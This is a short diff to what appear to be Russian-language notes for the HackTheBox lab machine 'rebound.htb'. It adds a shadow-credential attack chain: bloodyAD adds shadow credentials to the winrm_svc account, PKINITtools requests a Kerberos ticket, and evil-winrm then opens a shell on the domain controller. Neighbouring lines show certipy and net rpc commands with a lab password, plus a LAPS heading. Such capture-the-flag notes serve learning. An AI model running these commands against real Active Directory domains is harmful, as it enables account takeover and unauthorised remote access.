@@ -480,6 +480,15 @@ net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "
 
  certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb		(shadow credential)
  
+./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add shadowCredentials winrm_svc 		(shadow credential)
+
+ python3 PKINITtools/gettgtpkinit.py -cert-pem ipWe9rd5_cert.pem -key-pem ipWe9rd5_priv.pem rebound.htb/winrm_svc ipWe9rd5.ccache 	(получение билета керберос)
+
+ export KRB5CCNAME=ipWe9rd5.ccache
+
+ evil-winrm -i dc01.rebound.htb -r rebound.htb
+ 
+ 
  # Получение пароля LAPS Admin
 
 	Юзер состоит в групе LAPS Admin
